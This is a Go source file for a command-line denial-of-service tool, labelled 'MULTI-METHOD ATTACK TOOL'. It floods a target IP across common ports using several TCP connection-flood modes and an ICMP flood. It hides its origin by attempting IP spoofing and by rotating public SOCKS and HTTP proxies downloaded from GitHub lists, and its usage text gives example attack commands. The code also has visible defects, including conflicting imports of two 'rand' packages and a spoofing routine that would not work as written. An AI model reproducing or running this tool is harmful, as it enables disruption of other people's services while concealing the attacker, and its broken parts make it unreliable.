package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"math/rand"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	"golang.org/x/net/proxy"
)

// ==================== CONSTANTES ====================
const (
	MAX_TFO_QUEUE = 1000
)

var (
	stats     = &Statistics{}
	startTime = time.Now()
	running   int32 = 1
	config    AttackConfig
)

// ==================== ESTRUCTURAS ====================
type Statistics struct {
	connections        int64
	successfulAttacks  int64
	packetsSent        int64
	totalDataSent      int64
	connectionErrors   int64
	sendErrors         int64
	tcpErrors          int64
	arpPacketsSent     int64
	window0PacketsSent int64
	icmpPacketsSent    int64
	finPacketsSent     int64
	synPacketsSent     int64
	rstPacketsSent     int64
	pshPacketsSent     int64
	urgPacketsSent     int64
	ackPacketsSent     int64
	tfoPacketsSent     int64
	tfoConnections     int64
	proxiesUsed        int64
	proxyErrors        int64
	spoofedPackets     int64
}

type AttackConfig struct {
	targetIP   string
	targetPort string
	ports      string
	threads    int
	packetSize int
	duration   time.Duration
	mode       string
	iface      string
	useProxies bool
	socks4     bool
	socks5     bool
	proxyURL   string
	proxyFile  string
	maxProxies int
	spoofIP    bool
	spoofRange string
}

// ==================== IP SPOOFING ====================

// generateSpoofedIP genera una IP falsificada
func generateSpoofedIP() net.IP {
	if config.spoofRange != "" {
		// Usar rango especificado (ej: "192.168.1.0/24")
		if ip := generateIPFromRange(config.spoofRange); ip != nil {
			return ip
		}
	}
	
	// Generar IP aleatoria común
	ip := make([]byte, 4)
	rand.Read(ip)
	
	// Evitar IPs especiales
	ip[0] = byte(10) // Redes 10.x.x.x
	ip[1] = byte(rand.Intn(255))
	ip[2] = byte(rand.Intn(255))
	ip[3] = byte(rand.Intn(254)) + 1 // Evitar .0 y .255
	
	return net.IP(ip)
}

func generateIPFromRange(cidr string) net.IP {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil
	}
	
	// Convertir a int
	ones, bits := ipnet.Mask.Size()
	size := 1 << uint(bits-ones)
	
	// IP base
	baseIP := binary.BigEndian.Uint32(ipnet.IP.To4())
	
	// Generar offset aleatorio
	offset := uint32(rand.Intn(size-2)) + 1 // Evitar primera y última
	
	// Calcular IP
	ipInt := baseIP + offset
	ip := make(net.IP, 4)
	binary.BigEndian.PutUint32(ip, ipInt)
	
	return ip
}

// spoofedDialer crea un dialer que simula IP spoofing
func spoofedDialer(target string) (net.Conn, error) {
	if !config.spoofIP {
		return net.Dial("tcp", target)
	}
	
	// Crear socket raw para spoofing
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, syscall.IPPROTO_TCP)
	if err != nil {
		return nil, err
	}
	
	// Configurar socket
	syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_REUSEADDR, 1)
	
	// Generar IP spoofed
	spoofedIP := generateSpoofedIP()
	
	// Configurar dirección local spoofed
	var localAddr syscall.SockaddrInet4
	copy(localAddr.Addr[:], spoofedIP.To4())
	localAddr.Port = 0 // Puerto aleatorio
	
	// Bind a la IP spoofed
	if err := syscall.Bind(fd, &localAddr); err != nil {
		syscall.Close(fd)
		return nil, err
	}
	
	// Parsear dirección objetivo
	tcpAddr, err := net.ResolveTCPAddr("tcp", target)
	if err != nil {
		syscall.Close(fd)
		return nil, err
	}
	
	// Configurar dirección remota
	var remoteAddr syscall.SockaddrInet4
	copy(remoteAddr.Addr[:], tcpAddr.IP.To4())
	remoteAddr.Port = tcpAddr.Port
	
	// Conectar
	if err := syscall.Connect(fd, &remoteAddr); err != nil {
		syscall.Close(fd)
		return nil, err
	}
	
	// Convertir fd a net.Conn
	file := os.NewFile(uintptr(fd), "spoofed-socket")
	defer file.Close()
	
	conn, err := net.FileConn(file)
	if err != nil {
		return nil, err
	}
	
	atomic.AddInt64(&stats.spoofedPackets, 1)
	return conn, nil
}

// ==================== GESTIÓN DE PROXIES ====================
var (
	proxyList   []string
	proxyIndex  int32 = 0
	proxyMutex  sync.RWMutex
)

func downloadProxies() error {
	proxyMutex.Lock()
	defer proxyMutex.Unlock()
	
	proxyList = []string{}
	
	proxySources := []struct {
		url     string
		proxyType string
	}{
		{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", "socks4"},
		{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", "socks5"},
		{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", "http"},
	}
	
	for _, source := range proxySources {
		if (config.socks4 && source.proxyType != "socks4") && 
		   (config.socks5 && source.proxyType != "socks5") &&
		   (!config.socks4 && !config.socks5 && source.proxyType != "http") {
			continue
		}
		
		resp, err := http.Get(source.url)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		
		scanner := bufio.NewScanner(resp.Body)
		for scanner.Scan() {
			proxyAddr := strings.TrimSpace(scanner.Text())
			if proxyAddr == "" {
				continue
			}
			
			var formattedProxy string
			switch source.proxyType {
			case "socks4":
				formattedProxy = fmt.Sprintf("socks4://%s", proxyAddr)
			case "socks5":
				formattedProxy = fmt.Sprintf("socks5://%s", proxyAddr)
			case "http":
				formattedProxy = fmt.Sprintf("http://%s", proxyAddr)
			}
			
			proxyList = append(proxyList, formattedProxy)
			
			if config.maxProxies > 0 && len(proxyList) >= config.maxProxies {
				break
			}
		}
		
		if config.maxProxies > 0 && len(proxyList) >= config.maxProxies {
			break
		}
	}
	
	if config.proxyFile != "" {
		loadProxiesFromFile(config.proxyFile)
	}
	
	if config.proxyURL != "" {
		proxyList = append(proxyList, config.proxyURL)
	}
	
	if len(proxyList) == 0 {
		return fmt.Errorf("no proxies loaded")
	}
	
	return nil
}

func loadProxiesFromFile(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		return
	}
	defer file.Close()
	
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxyAddr := strings.TrimSpace(scanner.Text())
		if proxyAddr == "" {
			continue
		}
		
		if !strings.HasPrefix(proxyAddr, "socks4://") && 
		   !strings.HasPrefix(proxyAddr, "socks5://") && 
		   !strings.HasPrefix(proxyAddr, "http://") {
			if config.socks4 {
				proxyAddr = fmt.Sprintf("socks4://%s", proxyAddr)
			} else {
				proxyAddr = fmt.Sprintf("socks5://%s", proxyAddr)
			}
		}
		
		proxyList = append(proxyList, proxyAddr)
		
		if config.maxProxies > 0 && len(proxyList) >= config.maxProxies {
			break
		}
	}
}

func getNextProxy() (string, error) {
	proxyMutex.RLock()
	defer proxyMutex.RUnlock()
	
	if len(proxyList) == 0 {
		return "", fmt.Errorf("no proxies available")
	}
	
	index := atomic.LoadInt32(&proxyIndex) % int32(len(proxyList))
	atomic.AddInt32(&proxyIndex, 1)
	
	return proxyList[index], nil
}

func createProxyDialer() (proxy.ContextDialer, error) {
	if !config.useProxies || len(proxyList) == 0 {
		return proxy.Direct, nil
	}
	
	proxyURL, err := getNextProxy()
	if err != nil {
		return proxy.Direct, err
	}
	
	parsedURL, err := url.Parse(proxyURL)
	if err != nil {
		atomic.AddInt64(&stats.proxyErrors, 1)
		return proxy.Direct, err
	}
	
	dialer, err := proxy.FromURL(parsedURL, proxy.Direct)
	if err != nil {
		atomic.AddInt64(&stats.proxyErrors, 1)
		return proxy.Direct, err
	}
	
	atomic.AddInt64(&stats.proxiesUsed, 1)
	return dialer.(proxy.ContextDialer), nil
}

func dialWithProxy(network, address string, timeout time.Duration) (net.Conn, error) {
	if config.spoofIP {
		// Usar spoofing en lugar de proxy
		return spoofedDialer(address)
	}
	
	dialer, err := createProxyDialer()
	if err != nil {
		return nil, err
	}
	
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	
	return dialer.DialContext(ctx, network, address)
}

// ==================== MÉTODOS DE ATAQUE ====================
func TCPTfoAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := dialWithProxy("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)
		
		go func(c net.Conn) {
			defer func() {
				c.Close()
				atomic.AddInt64(&stats.tfoPacketsSent, 1)
				atomic.AddInt64(&stats.successfulAttacks, 1)
			}()

			buf := make([]byte, config.packetSize)
			rand.Read(buf)
			c.Write(buf)
			atomic.AddInt64(&stats.packetsSent, 1)
			atomic.AddInt64(&stats.totalDataSent, int64(len(buf)))
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

func TCPFinAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := dialWithProxy("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)
		
		go func(c net.Conn) {
			defer func() {
				c.Close()
				atomic.AddInt64(&stats.finPacketsSent, 1)
				atomic.AddInt64(&stats.successfulAttacks, 1)
			}()

			buf := make([]byte, config.packetSize)
			rand.Read(buf)
			c.Write(buf)
			atomic.AddInt64(&stats.packetsSent, 1)
			atomic.AddInt64(&stats.totalDataSent, int64(len(buf)))
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

func TCPSynAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := dialWithProxy("tcp", targetAddr, 1*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(5 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)
		atomic.AddInt64(&stats.synPacketsSent, 1)
		conn.Close()
		time.Sleep(1 * time.Millisecond)
	}
}

func TCPRstAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := dialWithProxy("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)

		if tcpConn, ok := conn.(*net.TCPConn); ok {
			tcpConn.SetLinger(0)
		}

		go func(c net.Conn) {
			defer func() {
				c.Close()
				atomic.AddInt64(&stats.rstPacketsSent, 1)
				atomic.AddInt64(&stats.successfulAttacks, 1)
			}()

			buf := make([]byte, 64)
			rand.Read(buf)
			c.Write(buf)
			atomic.AddInt64(&stats.packetsSent, 1)
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

func TCPPshAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := dialWithProxy("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)

		go func(c net.Conn) {
			defer c.Close()

			buf := make([]byte, config.packetSize)
			for i := 0; i < 10 && atomic.LoadInt32(&running) == 1; i++ {
				rand.Read(buf)
				c.Write(buf)
				atomic.AddInt64(&stats.pshPacketsSent, 1)
				atomic.AddInt64(&stats.packetsSent, 1)
				atomic.AddInt64(&stats.totalDataSent, int64(len(buf)))
				time.Sleep(10 * time.Millisecond)
			}
			atomic.AddInt64(&stats.successfulAttacks, 1)
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

func TCPUrgAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := dialWithProxy("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)

		go func(c net.Conn) {
			defer c.Close()

			for i := 0; i < 20 && atomic.LoadInt32(&running) == 1; i++ {
				buf := make([]byte, 32)
				rand.Read(buf)
				c.Write(buf)
				atomic.AddInt64(&stats.urgPacketsSent, 1)
				atomic.AddInt64(&stats.packetsSent, 1)
				time.Sleep(5 * time.Millisecond)
			}
			atomic.AddInt64(&stats.successfulAttacks, 1)
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

func TCPAckAttack(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := dialWithProxy("tcp", targetAddr, 2*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(10 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)

		go func(c net.Conn) {
			defer c.Close()

			buf := make([]byte, 128)
			for atomic.LoadInt32(&running) == 1 {
				rand.Read(buf)
				c.Write(buf)
				atomic.AddInt64(&stats.ackPacketsSent, 1)
				atomic.AddInt64(&stats.packetsSent, 1)
				time.Sleep(20 * time.Millisecond)
			}
			atomic.AddInt64(&stats.successfulAttacks, 1)
		}(conn)

		time.Sleep(5 * time.Millisecond)
	}
}

func TCPWindowZero(targetAddr string, wg *sync.WaitGroup) {
	defer wg.Done()

	for atomic.LoadInt32(&running) == 1 {
		conn, err := dialWithProxy("tcp", targetAddr, 5*time.Second)
		if err != nil {
			atomic.AddInt64(&stats.connectionErrors, 1)
			time.Sleep(100 * time.Millisecond)
			continue
		}

		atomic.AddInt64(&stats.connections, 1)

		go func() {
			defer conn.Close()
			
			buf := make([]byte, 1460)
			for atomic.LoadInt32(&running) == 1 {
				rand.Read(buf)
				conn.Write(buf)
				atomic.AddInt64(&stats.packetsSent, 1)
				atomic.AddInt64(&stats.totalDataSent, int64(len(buf)))
				atomic.AddInt64(&stats.window0PacketsSent, 1)
				time.Sleep(100 * time.Millisecond)
			}
		}()

		time.Sleep(50 * time.Millisecond)
	}
}

func ICMPFlood(targetIP string, wg *sync.WaitGroup) {
	defer wg.Done()

	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return
	}
	defer conn.Close()

	targetAddr, err := net.ResolveIPAddr("ip4", targetIP)
	if err != nil {
		return
	}

	msg := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   os.Getpid() & 0xffff,
			Seq:  1,
			Data: []byte("ATTACK"),
		},
	}

	packet, err := msg.Marshal(nil)
	if err != nil {
		return
	}

	for atomic.LoadInt32(&running) == 1 {
		for i := 0; i < 10; i++ {
			conn.WriteTo(packet, targetAddr)
			atomic.AddInt64(&stats.icmpPacketsSent, 1)
			atomic.AddInt64(&stats.packetsSent, 1)
		}
		time.Sleep(10 * time.Millisecond)
	}
}

// ==================== FUNCIONES AUXILIARES ====================
func getSystemStats() map[string]float64 {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)

	var memoryPercent float64
	if m.Sys > 0 {
		memoryPercent = float64(m.Alloc) / float64(m.Sys) * 100
	}

	return map[string]float64{
		"memory_percent": memoryPercent,
		"goroutines":     float64(runtime.NumGoroutine()),
	}
}

func printStats() {
	for atomic.LoadInt32(&running) == 1 {
		time.Sleep(5 * time.Second)
		duration := time.Since(startTime).Seconds()
		systemStats := getSystemStats()

		separator := strings.Repeat("=", 70)
		fmt.Printf("\n%s\n", separator)
		fmt.Printf("ATTACK STATISTICS - MODE: %s\n", strings.ToUpper(config.mode))
		fmt.Printf("Target: %s | Ports: %s\n", config.targetIP, config.ports)
		fmt.Printf("%s\n", separator)
		
		fmt.Printf("Time: %.0fs | Threads: %d\n", duration, config.threads)
		fmt.Printf("Connections: %d | Packets: %d\n", 
			atomic.LoadInt64(&stats.connections), atomic.LoadInt64(&stats.packetsSent))
		
		if config.spoofIP {
			fmt.Printf("Spoofed packets: %d\n", atomic.LoadInt64(&stats.spoofedPackets))
		}
		
		if config.useProxies {
			fmt.Printf("Proxies: %d used | Errors: %d\n", 
				atomic.LoadInt64(&stats.proxiesUsed), atomic.LoadInt64(&stats.proxyErrors))
		}
		
		if duration > 0 {
			rate := float64(atomic.LoadInt64(&stats.packetsSent)) / duration
			fmt.Printf("Rate: %.1f pps | ", rate)
			
			if totalData := atomic.LoadInt64(&stats.totalDataSent); totalData > 0 {
				bandwidth := (float64(totalData) / (1024 * 1024)) / duration
				fmt.Printf("BW: %.2f MB/s\n", bandwidth)
			}
		}
		
		fmt.Printf("System: Goroutines=%.0f Memory=%.1f%%\n", 
			systemStats["goroutines"], systemStats["memory_percent"])
		fmt.Printf("%s\n", separator)
	}
}

func optimizeSystemLimits() {
	var rLimit syscall.Rlimit
	if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit); err == nil {
		rLimit.Cur = rLimit.Max
		if rLimit.Cur < 65535 {
			rLimit.Cur = 65535
		}
		syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit)
	}
}

func parsePorts(portsStr string) []string {
	var ports []string
	
	portList := strings.Split(portsStr, ",")
	
	for _, port := range portList {
		port = strings.TrimSpace(port)
		
		if strings.Contains(port, "-") {
			parts := strings.Split(port, "-")
			if len(parts) == 2 {
				start, err1 := strconv.Atoi(parts[0])
				end, err2 := strconv.Atoi(parts[1])
				if err1 == nil && err2 == nil && start <= end {
					for i := start; i <= end; i++ {
						ports = append(ports, strconv.Itoa(i))
					}
				}
			}
		} else {
			ports = append(ports, port)
		}
	}
	
	if len(ports) == 0 {
		ports = []string{"22", "80", "443", "8080", "8443", "3306", "25565", "2222", "2022"}
	}
	
	return ports
}

func attackPort(port string, wg *sync.WaitGroup) {
	targetAddr := net.JoinHostPort(config.targetIP, port)
	
	switch config.mode {
	case "tfo":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPTfoAttack(targetAddr, wg)
		}
	case "fin":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPFinAttack(targetAddr, wg)
		}
	case "syn":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPSynAttack(targetAddr, wg)
		}
	case "rst":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPRstAttack(targetAddr, wg)
		}
	case "psh":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPPshAttack(targetAddr, wg)
		}
	case "urg":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPUrgAttack(targetAddr, wg)
		}
	case "ack":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPAckAttack(targetAddr, wg)
		}
	case "window0":
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPWindowZero(targetAddr, wg)
		}
	case "icmp":
		for i := 0; i < config.threads/10; i++ {
			wg.Add(1)
			go ICMPFlood(config.targetIP, wg)
		}
	case "all":
		methods := []func(string, *sync.WaitGroup){
			TCPTfoAttack, TCPFinAttack, TCPSynAttack, TCPRstAttack,
			TCPPshAttack, TCPUrgAttack, TCPAckAttack,
		}
		
		for _, method := range methods {
			for i := 0; i < config.threads/len(methods); i++ {
				wg.Add(1)
				go method(targetAddr, wg)
			}
		}
	default:
		for i := 0; i < config.threads; i++ {
			wg.Add(1)
			go TCPRstAttack(targetAddr, wg)
		}
	}
}

// ==================== FUNCIÓN PRINCIPAL ====================
func main() {
	flag.StringVar(&config.targetIP, "ip", "", "Target IP (required)")
	flag.StringVar(&config.ports, "ports", "22,80,443,8080,8443,3306,25565,2222,2022", "Ports")
	flag.IntVar(&config.threads, "threads", 100, "Threads per port")
	flag.IntVar(&config.packetSize, "size", 1024, "Packet size")
	flag.StringVar(&config.mode, "mode", "rst", "Attack mode: tfo,fin,syn,rst,psh,urg,ack,window0,icmp,all")
	flag.DurationVar(&config.duration, "duration", 0, "Duration (e.g., 30s, 5m)")
	flag.BoolVar(&config.useProxies, "proxies", false, "Use proxies")
	flag.BoolVar(&config.socks4, "socks4", false, "Use SOCKS4 proxies")
	flag.BoolVar(&config.socks5, "socks5", false, "Use SOCKS5 proxies")
	flag.StringVar(&config.proxyURL, "proxy-url", "", "Single proxy URL")
	flag.StringVar(&config.proxyFile, "proxy-file", "", "Proxy list file")
	flag.IntVar(&config.maxProxies, "max-proxies", 0, "Max proxies to use")
	flag.BoolVar(&config.spoofIP, "spoof", false, "Enable IP spoofing")
	flag.StringVar(&config.spoofRange, "spoof-range", "", "Spoof IP range (e.g., 192.168.1.0/24)")
	
	flag.Parse()
	
	if config.targetIP == "" {
		fmt.Println("ERROR: Target IP is required")
		fmt.Println("\nUsage: ./attacker -ip <IP> [options]")
		fmt.Println("\nOptions:")
		fmt.Println("  -ports PORTS        Ports to attack")
		fmt.Println("  -threads N          Threads per port")
		fmt.Println("  -size BYTES         Packet size")
		fmt.Println("  -mode MODE          Attack mode")
		fmt.Println("  -duration TIME      Attack duration")
		fmt.Println("  -proxies            Use proxies")
		fmt.Println("  -socks4             Use SOCKS4 proxies")
		fmt.Println("  -socks5             Use SOCKS5 proxies")
		fmt.Println("  -proxy-url URL      Single proxy URL")
		fmt.Println("  -proxy-file FILE    Proxy list file")
		fmt.Println("  -max-proxies N      Max proxies")
		fmt.Println("  -spoof              Enable IP spoofing")
		fmt.Println("  -spoof-range RANGE  Spoof IP range")
		fmt.Println("\nExamples:")
		fmt.Println("  ./attacker -ip 192.168.1.100 -mode syn -threads 500 -spoof")
		fmt.Println("  ./attacker -ip 192.168.1.100 -proxies -socks5 -threads 1000")
		fmt.Println("  ./attacker -ip 192.168.1.100 -spoof -spoof-range 10.0.0.0/8 -threads 2000")
		os.Exit(1)
	}
	
	optimizeSystemLimits()
	
	if config.spoofIP {
		fmt.Println("🎭 IP Spoofing enabled")
		if config.spoofRange != "" {
			fmt.Printf("📡 Using spoof range: %s\n", config.spoofRange)
		}
	} else if config.useProxies {
		fmt.Println("🔗 Loading proxies...")
		if err := downloadProxies(); err != nil {
			fmt.Printf("⚠️  %v\n", err)
			config.useProxies = false
		}
	}
	
	ports := parsePorts(config.ports)
	
	fmt.Printf("%s\n", strings.Repeat("=", 70))
	fmt.Printf("MULTI-METHOD ATTACK TOOL\n")
	fmt.Printf("Target: %s\n", config.targetIP)
	fmt.Printf("Ports: %s\n", strings.Join(ports, ","))
	fmt.Printf("Mode: %s | Threads: %d\n", strings.ToUpper(config.mode), config.threads)
	
	if config.spoofIP {
		fmt.Printf("Spoofing: ✅ Enabled")
		if config.spoofRange != "" {
			fmt.Printf(" (Range: %s)", config.spoofRange)
		}
		fmt.Println()
	} else if config.useProxies {
		fmt.Printf("Proxies: ✅ %d loaded\n", len(proxyList))
	}
	
	fmt.Printf("%s\n", strings.Repeat("=", 70))
	
	if config.duration > 0 {
		go func() {
			time.Sleep(config.duration)
			fmt.Printf("\n⏰ Time completed\n")
			atomic.StoreInt32(&running, 0)
		}()
	}
	
	go printStats()
	
	var wg sync.WaitGroup
	
	for _, port := range ports {
		fmt.Printf("▶ Attacking port %s\n", port)
		attackPort(port, &wg)
		time.Sleep(100 * time.Millisecond)
	}
	
	fmt.Printf("\n✅ Attack started\n")
	fmt.Printf("📊 Statistics every 5 seconds\n")
	
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	<-sigCh
	
	fmt.Printf("\n🛑 Stopping...\n")
	atomic.StoreInt32(&running, 0)
	wg.Wait()
	
	duration := time.Since(startTime)
	fmt.Printf("\n%s\n", strings.Repeat("=", 70))
	fmt.Printf("FINAL SUMMARY - Duration: %v\n", duration)
	fmt.Printf("%s\n", strings.Repeat("=", 70))
	fmt.Printf("Ports: %s\n", strings.Join(ports, ","))
	fmt.Printf("Connections: %d | Packets: %d\n", 
		atomic.LoadInt64(&stats.connections), atomic.LoadInt64(&stats.packetsSent))
	
	if config.spoofIP {
		fmt.Printf("Spoofed packets: %d\n", atomic.LoadInt64(&stats.spoofedPackets))
	}
	
	if config.useProxies {
		fmt.Printf("Proxies used: %d\n", atomic.LoadInt64(&stats.proxiesUsed))
	}
	
	if duration.Seconds() > 0 {
		rate := float64(atomic.LoadInt64(&stats.packetsSent)) / duration.Seconds()
		fmt.Printf("Average rate: %.1f packets/second\n", rate)
	}
	
	fmt.Printf("%s\n", strings.Repeat("=", 70))
}
